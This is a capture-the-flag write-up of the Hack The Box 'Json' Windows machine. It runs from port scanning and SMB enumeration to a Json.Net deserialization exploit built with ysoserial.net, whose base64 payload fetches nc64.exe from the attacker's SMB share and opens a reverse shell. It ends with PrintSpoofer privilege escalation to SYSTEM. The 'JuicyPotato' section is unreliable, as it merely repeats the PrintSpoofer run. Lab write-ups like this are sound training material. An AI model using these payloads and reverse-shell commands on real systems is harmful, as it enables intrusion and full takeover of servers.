---
title: HTB-Json Writeup
date: 2026-03-01T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - Windows
  - Writeup
  - HTB
---
## Initial Reconnaissance

### Nmap Prot Scan

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap --min-rate 10000 -p- 10.129.227.191 -oA port
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-01 01:13 EST
Nmap scan report for 10.129.227.191
Host is up (0.10s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 11.14 seconds
```

Extracting the ports for later use.

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ grep open port.nmap | awk -F '/' '{print $1}' | paste -sd ','
21,80,135,139,445,5985,47001,49152,49153,49154,49155,49156,49157,49158
```

### Nmap Detailed Scan

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap -sT -sC -sV -O -p21,80,135,139,445,5985,47001,49152,49153,49154,49155,49156,49157,49158 10.129.227.191                      

[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-01 01:17 EST
Nmap scan report for 10.129.227.191
Host is up (0.097s latency).

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          FileZilla ftpd 0.9.60 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp    open  http         Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Json HTB
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2012
OS CPE: cpe:/o:microsoft:windows_server_2012:r2
OS details: Microsoft Windows Server 2012 or 2012 R2
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: JSON, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:8d:d4 (VMware)
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-03-01T06:18:26
|_  start_date: 2026-03-01T06:05:01

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.77 seconds
```

### Nmap Vulnerability Script Scan

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap --script=vuln -p21,80,135,139,445,5985,47001,49152,49153,49154,49155,49156,49157,49158 10.129.227.191
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-01 21:35 EST
Nmap scan report for json.htb (10.129.227.191)
Host is up (0.12s latency).

PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /login.html: Possible admin folder
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: No accounts left to try

Nmap done: 1 IP address (1 host up) scanned in 482.23 seconds
```

Add domain resolution to the `hosts` file.

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo sed -i '1i 10.129.227.191 json.htb' /etc/hosts 
                           
┌──(kali㉿kali)-[~/Work/Kali]
└─$ head -n 1 /etc/hosts
10.129.227.191 json.htb
```

## 21-ftp Penetration

Nmap scan revealed the port 21/tcp is open.Attempting anonymous login.

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ ftp json.htb
Trying 10.129.227.191:21 ...
Connected to json.htb.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (json.htb:kali): anonymous
331 Password required for anonymous
Password: 
530 Login or password incorrect!
ftp: Login failed
ftp> ls
530 Please log in with USER and PASS first.
530 Please log in with USER and PASS first.
ftp: Can't bind for data connection: Address already in use
```

Anonymous login failed.The FTP server is running `FileZilla`.Searching for any public exploits.

```bash
──(kali㉿kali)-[~/Work/Kali]
└─$ searchsploit FileZilla 0.9                         
-------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                          |  Path
-------------------------------------------------------------------------------------------------------- ---------------------------------
FileZilla FTP Server 0.9.20b/0.9.21 - 'STOR' Denial of Service                                          | windows/dos/2901.php
FileZilla FTP Server 0.9.21 - 'LIST/NLST' Denial of Service                                             | windows/dos/2914.php
FileZilla Server Terminal 0.9.4d - Buffer Overflow (PoC)                                                | windows/dos/1336.cpp
-------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

They are all Dos vulnerabilities,which are not exploitable for our purpose.

## 445-Smb Penetartion

Anonymous enumeration using `smbmap` failed.

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ smbmap -H json.htb         

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                      
[!] Something weird happened on (10.129.227.191) Error occurs while reading from remote(104) on line 1015                    
[*] Closed 1 connections
```

Proceeding with further enumeration using `enum4linux`.

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ enum4linux-ng -A json.htb
ENUM4LINUX - next generation (v1.3.7)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... json.htb
[*] Username ......... ''
[*] Random Username .. 'cfxfhmar'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 =================================
|    Listener Scan on json.htb    |
 =================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =======================================================
|    NetBIOS Names and Workgroup/Domain for json.htb    |
 =======================================================
[+] Got domain/workgroup name: WORKGROUP
[+] Full NetBIOS names information:
- WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
- JSON            <00> -         B <ACTIVE>  Workstation Service
- JSON            <20> -         B <ACTIVE>  File Server Service
- MAC Address = 00-50-56-B9-D4-5B

 =====================================
|    SMB Dialect Check on json.htb    |
 =====================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: true
  SMB 2.0.2: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: false
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: false

 =======================================================
|    Domain Information via SMB session for json.htb    |
 =======================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: JSON
NetBIOS domain name: ''
DNS domain: json
FQDN: json
Derived membership: workgroup member
Derived domain: unknown

 =====================================
|    RPC Session Check on json.htb    |
 =====================================
[*] Check for anonymous access (null session)
[-] Could not establish null session: STATUS_ACCESS_DENIED
[*] Check for guest access
[-] Could not establish guest session: STATUS_LOGON_FAILURE
[-] Sessions failed, neither null nor user sessions were possible

 ===========================================
|    OS Information via RPC for json.htb    |
 ===========================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Skipping 'srvinfo' run, not possible with provided credentials
[+] After merging OS information we have the following result:
OS: Windows Server 2012 R2 Datacenter 9600
OS version: '6.3'
OS release: ''
OS build: '9600'
Native OS: Windows Server 2012 R2 Datacenter 9600
Native LAN manager: Windows Server 2012 R2 Datacenter 6.3
Platform id: null
Server type: null
Server type string: null

[!] Aborting remainder of tests since sessions failed, rerun with valid credentials

Completed after 11.72 seconds
```

`json.htb` belongs to the `WORKGROUP` workgroup,and its `NetBIOS` name is `JSON`.It has SMB and NetBIOS services open on ports 445/tcp and 139/tcp respectively.The host supports multiple SMB protocols with SMB 3.0 as the preferred one,and SMB 1.0 is not disable,which means legacy SMB vulnerabilities might be exploitable.The target OS is confirmed to be `Windows Server 2012 R2 Datacenter`.

Connections to LDAP and LDAPS were refused,indicating these services are either closed or blocked by a firewall,which aligns with the Nmap scan results.Attempts to access RPC via null session or random users failed due to insufficient privileges,showing that the target host implements strict access controls for unauthenticated users.

## Web-80 Penetration

Opening the Web service on port 80 reveals a login prompt.

![](Pasted%20image%2020260302110209.png)

Successfully logged into the backend using the weak credentials `admin:damin`.

![](Pasted%20image%2020260302110414.png)

At the bottom,under `Development Approach`,it mentions that this admin dashboard is indeed `SB Admin 2`.

![](Pasted%20image%2020260302110511.png)

Inspecting the source code further cofirms that this admin dashboard `SB Admin 2`.

![](Pasted%20image%2020260302110712.png)

Continuing to review the source code,inspecting `js/app.min.js` reveals some custom logic.

```app.min.js
var _0xd18f = ["\x70\x72\x69\x6E\x63\x69\x70\x61\x6C\x43\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", "\x24\x68\x74\x74\x70", "\x24\x73\x63\x6F\x70\x65", "\x24\x63\x6F\x6F\x6B\x69\x65\x73", "\x4F\x41\x75\x74\x68\x32", "\x67\x65\x74", "\x55\x73\x65\x72\x4E\x61\x6D\x65", "\x4E\x61\x6D\x65", "\x64\x61\x74\x61", "\x72\x65\x6D\x6F\x76\x65", "\x68\x72\x65\x66", "\x6C\x6F\x63\x61\x74\x69\x6F\x6E", "\x6C\x6F\x67\x69\x6E\x2E\x68\x74\x6D\x6C", "\x74\x68\x65\x6E", "\x2F\x61\x70\x69\x2F\x41\x63\x63\x6F\x75\x6E\x74\x2F", "\x63\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", "\x6C\x6F\x67\x69\x6E\x43\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", "\x63\x72\x65\x64\x65\x6E\x74\x69\x61\x6C\x73", "", "\x65\x72\x72\x6F\x72", "\x69\x6E\x64\x65\x78\x2E\x68\x74\x6D\x6C", "\x6C\x6F\x67\x69\x6E", "\x6D\x65\x73\x73\x61\x67\x65", "\x49\x6E\x76\x61\x6C\x69\x64\x20\x43\x72\x65\x64\x65\x6E\x74\x69\x61\x6C\x73\x2E", "\x73\x68\x6F\x77", "\x6C\x6F\x67", "\x2F\x61\x70\x69\x2F\x74\x6F\x6B\x65\x6E", "\x70\x6F\x73\x74", "\x6A\x73\x6F\x6E", "\x6E\x67\x43\x6F\x6F\x6B\x69\x65\x73", "\x6D\x6F\x64\x75\x6C\x65"]; angular[_0xd18f[30]](_0xd18f[28], [_0xd18f[29]])[_0xd18f[15]](_0xd18f[16], [_0xd18f[1], _0xd18f[2], _0xd18f[3], function (_0x30f6x1, _0x30f6x2, _0x30f6x3) { _0x30f6x2[_0xd18f[17]] = { UserName: _0xd18f[18], Password: _0xd18f[18] }; _0x30f6x2[_0xd18f[19]] = { message: _0xd18f[18], show: false }; var _0x30f6x4 = _0x30f6x3[_0xd18f[5]](_0xd18f[4]); if (_0x30f6x4) { window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[20] }; _0x30f6x2[_0xd18f[21]] = function () { _0x30f6x1[_0xd18f[27]](_0xd18f[26], _0x30f6x2[_0xd18f[17]])[_0xd18f[13]](function (_0x30f6x5) { window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[20] }, function (_0x30f6x6) { _0x30f6x2[_0xd18f[19]][_0xd18f[22]] = _0xd18f[23]; _0x30f6x2[_0xd18f[19]][_0xd18f[24]] = true; console[_0xd18f[25]](_0x30f6x6) }) } }])[_0xd18f[15]](_0xd18f[0], [_0xd18f[1], _0xd18f[2], _0xd18f[3], function (_0x30f6x1, _0x30f6x2, _0x30f6x3) { var _0x30f6x4 = _0x30f6x3[_0xd18f[5]](_0xd18f[4]); if (_0x30f6x4) { _0x30f6x1[_0xd18f[5]](_0xd18f[14], { headers: { "\x42\x65\x61\x72\x65\x72": _0x30f6x4 } })[_0xd18f[13]](function (_0x30f6x5) { _0x30f6x2[_0xd18f[6]] = _0x30f6x5[_0xd18f[8]][_0xd18f[7]] }, function (_0x30f6x6) { _0x30f6x3[_0xd18f[9]](_0xd18f[4]); window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[12] }) } else { window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[12] } }])
```

Discovered that the source code is obfuscated.Using an AI tool to deobfuscate it.

```bash
// 定义一个名为 "json" 的 AngularJS 模块，依赖 ngCookies
angular.module("json", ["ngCookies"])

// 登录控制器
.controller("loginController", ["$http", "$scope", "$cookies", 
    function ($http, $scope, $cookies) {
        // 初始化登录凭证
        $scope.credentials = { 
            UserName: "", 
            Password: "" 
        };
        
        // 初始化错误信息
        $scope.error = { 
            message: "", 
            show: false 
        };
        
        // 检查是否已有 OAuth2 token
        var token = $cookies.get("OAuth2");
        if (token) { 
            // 如果已登录，重定向到首页
            window.location.href = "index.html";
        }
        
        // 登录函数
        $scope.login = function () {
            // POST 请求到 /api/token 端点
            $http.post("/api/token", $scope.credentials)
                .then(
                    function (response) {
                        // 登录成功，跳转到首页
                        window.location.href = "index.html";
                    }, 
                    function (error) {
                        // 登录失败，显示错误信息
                        $scope.error.message = "Invalid Credentials.";
                        $scope.error.show = true;
                        console.log(error);
                    }
                );
        };
    }
])

// 主控制器
.controller("principalController", ["$http", "$scope", "$cookies", 
    function ($http, $scope, $cookies) {
        // 获取 OAuth2 token
        var token = $cookies.get("OAuth2");
        
        if (token) {
            // 使用 token 获取用户信息
            $http.get("/api/Account/", { 
                headers: { 
                    "Bearer": token 
                } 
            })
            .then(
                function (response) {
                    // 设置用户名
                    $scope.UserName = response.data.Name;
                }, 
                function (error) {
                    // Token 无效，删除并重定向到登录页
                    $cookies.remove("OAuth2");
                    window.location.href = "login.html";
                }
            );
        } else {
            // 没有 token，重定向到登录页
            window.location.href = "login.html";
        }
    }
]);

```

Tow controllers,`loginController` and `PrincipalController` are defined to handle login and authentication functionalities.

Entered random credentials on the login page and intercepted the traffic using Burp Suite for observation.

![](Pasted%20image%2020260302112209.png)

Sent the request to Repeater and replayed it to examine the response.

![](Pasted%20image%2020260302112321.png)

Based on the previouslu deobfuscated JS code,changed the method to GET,targeted the `/api/Account` endpoint,and suppied an arbitrary `Bearer` token.

![](Pasted%20image%2020260302113001.png)
Shortening the length of the Bearer token triggers a `Cannot deserialize Json.Net Object` error,indicating that `Json.Net` object deserialization is being used here. Since the provided Bearer value is plain text `enil`, it cannot be deserialized. The Bearer field needs to be properly formatted as a serialized object.

![](Pasted%20image%2020260302143248.png)

The above findings indicate the tech stack is ASP.NET and it uses the Json.Net library to process JSON data. We will use ysoserial.net to generate a payload.

Using a `ping` command to create a simplified payload to verify the existence of the deserialization vulnerability.

```bash
(base) PS D:\Github Study\Ysoserial\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release> .\ysoserial.exe -c "ping -n 10 10.10.16.155" -o base64 -g ObjectDataProvider -f Json.Net
ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIHBpbmcgLW4gMTAgMTAuMTAuMTYuMTU1J10NCiAgICB9LA0KICAgICdPYmplY3RJbnN0YW5jZSc6eyckdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5J30NCn0=
```

Monitoring traffic with `tshark` in Kali, pasting the generated payload into the Bearer field, and replaying the request.

![](Pasted%20image%2020260302145914.png)

Kali successfully captured the ICMP ping requests, confirming the deserialization vulnerability exists. Preparing `nc` on Kali and using `smbserver` for remote execution.

```bash
┌──(kali㉿kali)-[~/Work]
└─$ ls -liah nc64.exe 
2551692 -rwxrwxrwx 1 kali kali 54K Dec 15 00:40 nc64.exe
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work]
└─$ sudo impacket-smbserver Enil . -smb2support
[sudo] password for kali: 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

Generating the final exploit payload.

```bash
(base) PS D:\Github Study\Ysoserial\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release> .\ysoserial.exe -c "START /B \\10.10.16.155\Enil\nc64.exe 10.10.16.155 443 -e cmd.exe" -o base64 -g ObjectDataProvider -f Json.Net
ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIFNUQVJUIC9CIFxcXFwxMC4xMC4xNi4xNTVcXEVuaWxcXG5jNjQuZXhlIDEwLjEwLjE2LjE1NSA0NDMgLWUgY21kLmV4ZSddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9
```

- `-c`: Stands for `command`, specifying the system command to execute.
- `START /B`: Starts a new process in the background on Windows without opening a new window. Here it's used to run a background task.
- `-o`: Specifies the output format.
- `-g`: Specifies the gadget to be used, which can be exploited during deserialization to execute arbitrary code. `ObjectDataProvider` is the specified gadget type here; it's a class in the WPF framework often used for command injection.
- `-f`: Specifies the serialization framework.

Starting a listener, placing the payload into the Bearer token, and replaying the request. Successfully obtained a cmd reverse shell.

```bash
┌──(kali㉿kali)-[~/Work/Kali/CVE-2015-1635-POC]
└─$ sudo rlwrap -cAr nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.155] from (UNKNOWN) [10.129.227.191] 50626
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>hostname
hostname
json
```

Checking `systeminfo`.

```bash
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 JSON
OS Name:                   Microsoft Windows Server 2012 R2 Datacenter
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-80005-00001-AA602
Original Install Date:     5/22/2019, 4:27:16 PM
System Boot Time:          3/1/2026, 8:27:41 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              es-mx;Spanish (Mexico)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     8,191 MB
Available Physical Memory: 7,535 MB
Virtual Memory: Max Size:  9,471 MB
Virtual Memory: Available: 8,808 MB
Virtual Memory: In Use:    663 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.10.2
                                 IP address(es)
                                 [01]: 10.129.227.191
                                 [02]: fe80::f19f:1378:66b2:439f
                                 [03]: dead:beef::f19f:1378:66b2:439f
                                 [04]: dead:beef::4f
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

## Privilege Escalation Enumeration

Checking the current user's privileges.

```bash
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

The user has `SeImpersonatePrivilege`, so we can consider using RottenPotato for privilege escalation. Alternatively, `PrintSpoofer` can also be used.

Transferring PrintSpoofer to the target machine.

```bash
c:\windows\system32\inetsrv>cd c:\programdata
cd c:\programdata

c:\ProgramData>mkdir apps
mkdir apps

c:\ProgramData>cd apps
cd apps

c:\ProgramData\apps>copy \\10.10.16.155\Enil\PrintSpoofer64.exe .\PrintSpoofer64.exe
copy \\10.10.16.155\Enil\PrintSpoofer64.exe .\PrintSpoofer64.exe
        1 file(s) copied.

c:\ProgramData\apps>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEF2-0DF2

 Directory of c:\ProgramData\apps

03/02/2026  03:00 AM    <DIR>          .
03/02/2026  03:00 AM    <DIR>          ..
03/02/2026  02:55 AM            27,136 PrintSpoofer64.exe
               1 File(s)         27,136 bytes
               2 Dir(s)   4,617,351,168 bytes free
```

Attempting to execute it for privilege escalation.

```bash
c:\ProgramData\apps>PrintSpoofer64.exe -i -c cmd.exe
PrintSpoofer64.exe -i -c cmd.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

## Alternative Privilege Escalation Methods

### Potato Privilege Escalation

Transferring JuicyPotato.exe to the target machine.

```bash
c:\ProgramData\apps>copy \\10.10.16.155\Enil\JuicyPotato.exe .\JuicyPotato.exe
copy \\10.10.16.155\Enil\JuicyPotato.exe .\JuicyPotato.exe
        1 file(s) copied.

c:\ProgramData\apps>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEF2-0DF2

 Directory of c:\ProgramData\apps

03/02/2026  03:40 AM    <DIR>          .
03/02/2026  03:40 AM    <DIR>          ..
12/06/2021  06:35 PM           347,648 JuicyPotato.exe
03/02/2026  02:55 AM            27,136 PrintSpoofer64.exe
               2 File(s)        374,784 bytes
               2 Dir(s)   4,617,109,504 bytes free
```

Exploiting it to escalate privileges.

```bash
c:\ProgramData\apps>PrintSpoofer64.exe -i -c cmd.exe
PrintSpoofer64.exe -i -c cmd.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```